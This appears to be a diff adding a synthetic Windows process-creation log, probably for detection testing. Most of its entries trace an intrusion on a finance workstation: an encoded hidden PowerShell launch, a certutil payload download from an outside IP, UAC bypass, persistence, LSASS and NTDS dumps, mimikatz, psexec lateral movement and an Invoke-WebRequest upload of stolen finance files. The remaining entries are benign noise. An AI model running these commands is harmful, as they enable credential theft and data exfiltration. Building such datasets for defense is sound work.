@@ -1,0 +1,24 @@
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "outlook.exe", "CommandLine": "outlook.exe", "ParentImage": "explorer.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "winword.exe", "CommandLine": "winword.exe /n Invoice_Q3.docm", "ParentImage": "outlook.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "ParentImage": "winword.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://185.99.133.12/beacon.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\svc.exe", "ParentImage": "powershell.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "fodhelper.exe", "CommandLine": "C:\\Windows\\System32\\fodhelper.exe", "ParentImage": "svc.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "reg.exe", "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /d C:\\Users\\jdoe\\AppData\\Local\\Temp\\svc.exe /f", "ParentImage": "svc.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "rundll32.exe", "CommandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full", "ParentImage": "svc.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "mimikatz.exe", "CommandLine": "mimikatz.exe sekurlsa::logonpasswords exit", "ParentImage": "cmd.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "whoami.exe", "CommandLine": "whoami.exe /priv", "ParentImage": "cmd.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "net.exe", "CommandLine": "net group \"Domain Admins\" /domain", "ParentImage": "cmd.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "nltest.exe", "CommandLine": "nltest /dclist:corp.local", "ParentImage": "cmd.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "sc.exe", "CommandLine": "sc.exe create UpdaterSvc binPath= C:\\ProgramData\\updater.exe start= auto", "ParentImage": "cmd.exe"}
+{"host": "WKS-FINANCE-04", "user": "jdoe", "EventCode": "4688", "process_name": "psexec.exe", "CommandLine": "psexec.exe \\\\FILESERVER-03 -u corp\\administrator -p Summer2026! cmd.exe /c whoami", "ParentImage": "cmd.exe"}
+{"host": "FILESERVER-03", "user": "administrator", "EventCode": "4688", "process_name": "cmd.exe", "CommandLine": "cmd.exe /c whoami", "ParentImage": "PSEXESVC.exe"}
+{"host": "FILESERVER-03", "user": "administrator", "EventCode": "4688", "process_name": "mstsc.exe", "CommandLine": "mstsc.exe /v:10.0.20.40", "ParentImage": "explorer.exe"}
+{"host": "DC-01", "user": "administrator", "EventCode": "4688", "process_name": "ntdsutil.exe", "CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ntds\" q q", "ParentImage": "cmd.exe"}
+{"host": "FILESERVER-03", "user": "administrator", "EventCode": "4688", "process_name": "powershell.exe", "CommandLine": "powershell.exe Compress-Archive -Path \\\\FILESERVER-03\\Finance\\* -DestinationPath C:\\temp\\loot.zip", "ParentImage": "cmd.exe"}
+{"host": "FILESERVER-03", "user": "administrator", "EventCode": "4688", "process_name": "powershell.exe", "CommandLine": "powershell.exe Invoke-WebRequest -Uri http://185.99.133.12/upload -Method POST -InFile C:\\temp\\loot.zip", "ParentImage": "cmd.exe"}
+{"host": "WKS-ENG-11", "user": "asmith", "EventCode": "4688", "process_name": "chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentImage": "explorer.exe"}
+{"host": "WKS-ENG-11", "user": "asmith", "EventCode": "4688", "process_name": "Teams.exe", "CommandLine": "Teams.exe", "ParentImage": "explorer.exe"}
+{"host": "WKS-HR-02", "user": "bwilson", "EventCode": "4688", "process_name": "notepad.exe", "CommandLine": "notepad.exe C:\\Users\\bwilson\\notes.txt", "ParentImage": "explorer.exe"}
+{"host": "WKS-HR-02", "user": "bwilson", "EventCode": "4688", "process_name": "excel.exe", "CommandLine": "excel.exe Q3_Budget.xlsx", "ParentImage": "explorer.exe"}
+{"host": "SRV-DB-05", "user": "svc_sql", "EventCode": "4688", "process_name": "sqlservr.exe", "CommandLine": "sqlservr.exe -sMSSQLSERVER", "ParentImage": "services.exe"}
+{"host": "WKS-ENG-11", "user": "asmith", "EventCode": "4688", "process_name": "git.exe", "CommandLine": "git.exe pull origin main", "ParentImage": "cmd.exe"}
